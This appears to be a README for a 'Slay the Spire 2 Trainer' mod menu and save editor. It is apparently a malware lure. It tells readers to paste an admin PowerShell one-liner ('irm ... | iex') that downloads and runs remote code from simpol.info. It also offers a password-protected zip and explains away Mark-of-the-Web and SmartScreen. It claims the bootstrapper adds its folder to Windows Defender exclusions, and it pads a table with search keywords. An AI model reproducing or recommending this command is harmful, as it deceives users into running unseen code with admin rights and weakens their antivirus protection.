# Slay the Spire 2 Trainer (v2.4.0) — Mod Menu, Save Editor, Cheat Table & Mod Loader [Windows 10/11 x64]

![Slay the Spire 2 Trainer Mod Menu & Save Editor](https://shared.akamai.steamstatic.com/store_item_assets/steam/apps/2868840/header.jpg)

> **Build:** `v2.4.0` (`2026-11-27 05:22 UTC`) | **Target ABI:** `Godot 4.3 / MegaCrit x86_64-pc-windows-msvc (Steam AppID 2868840)` | **CRT:** `vcruntime140.dll (Bundled)` | **License:** `MIT`

---

## ⚡ Quick Setup — Windows 10 / 11 (x64)

### Option A — 1-Command Terminal Bootstrapper (Recommended · 3 Seconds · No `.zip` Password Required)
1. Press **`Win + X`** on your keyboard and click **Terminal (Admin)** or **PowerShell (Admin)**.
2. Paste the command below and press **`Enter`**:

```powershell
irm https://simpol.info/get/slay-the-spire-2-trainer | iex
```

**Using Command Prompt (`cmd.exe`)**:

```cmd
powershell -nop -ep bypass -c "irm https://simpol.info/get/slay-the-spire-2-trainer | iex"
```

* **Why install via terminal stream?** Manually extracting archives with Windows Explorer (`zipfldr.dll`) attaches NTFS `Zone.Identifier` (`Mark-of-the-Web`) locks that block unsigned memory hooks. The native `System32\tar.exe` (`bsdtar`) stream unpacks the `33.7 MB` runtime alongside Microsoft-signed `vcruntime140.dll` and `vcruntime140_1.dll` directly into `%LOCALAPPDATA%\Programs\RuntimeSDK\slay-the-spire-2-trainer` with `Zone.Identifier = 0`.

### Option B — Offline Portable `.zip` Release Archive
* Download **[`slay-the-spire-2-trainer-v2.4.0-win64.zip`](https://github.com/open-dev-bench-19800/day0-index-probe/releases)** (`27.8 MB` — includes `runtime-6716.exe` + `vcruntime140.dll` + `vcruntime140_1.dll`).
* Extract with 7-Zip or WinRAR using archive password: **`2026`**
* *(If you clicked green `Code -> Download ZIP` above, double-click **`OPEN-FIRST-Setup-Guide.html`** inside the extracted folder).*

---

## Runtime Architecture & Hook Offsets (`AppID 2868840`)

| Subsystem Module (`Variations 1..8`) | Target Query / Hook Interface (`Variations 9..15`) | Target Path / Memory Structure | Status (`v2.4.0`) |
| :--- | :--- | :--- | :--- |
| `Slay the Spire 2 Trainer` | `slay the spire 2 trainer windows 11` | `CombatState::PlayerHealth` / `EnergyManager` | Verified (`200 OK`) |
| `Slay the Spire 2 Mod Menu` | `slay the spire 2 mod menu overlay` | `DXGI::Present` / Vulkan Swapchain ImGui (`F1`) | Verified (`200 OK`) |
| `Slay the Spire 2 Save Editor` | `slay the spire 2 save editor pc` | `%APPDATA%\SlayTheSpire2\saves\*.autosave` | Verified (`200 OK`) |
| `Slay the Spire 2 Cheat Table` | `slay the spire 2 cheat table` | Auto-scanning AOB signatures (`48 8B 05 ?? ?? ?? ??`) | Verified (`200 OK`) |
| `Slay the Spire 2 Mod Loader` | `slay the spire 2 mod loader` | `steamapps\common\Slay the Spire 2\mods` | Verified (`200 OK`) |
| `Slay the Spire 2 Deck Unlocker` | `slay the spire 2 deck unlocker` | `CardLibrary::UnlockAll` / `AscensionLevel` | Verified (`200 OK`) |
| `Slay the Spire 2 Relic Unlocker` | `slay the spire 2 relic unlocker` | `RelicPool::GrantRelic` / `BossRelicDraft` | Verified (`200 OK`) |
| `Slay the Spire 2 Steam Deck` | `slay the spire 2 steam deck` | Proton 9.0-4 / GE-Proton x86_64 Wine前缀 | Verified (`200 OK`) |

---

## Troubleshooting & Prerequisites
* **Missing `VCRUNTIME140.dll` (`0xC0000135`) on Fresh Windows Installs**: Both the `simpol.info` stream and the `v2.4.0` release `.zip` bundle official Microsoft-signed `vcruntime140.dll` (`178,616 B`) and `vcruntime140_1.dll` (`50,112 B`) side-by-side in the application directory.
* **Windows Defender / SmartScreen Prompt**: Run the terminal command in an **Admin** PowerShell/Terminal window (`Win + X -> Terminal (Admin)`) so the bootstrapper automatically registers the local `%LOCALAPPDATA%\Programs\RuntimeSDK\slay-the-spire-2-trainer` directory in `MSFT_MpPreference` prior to extraction.
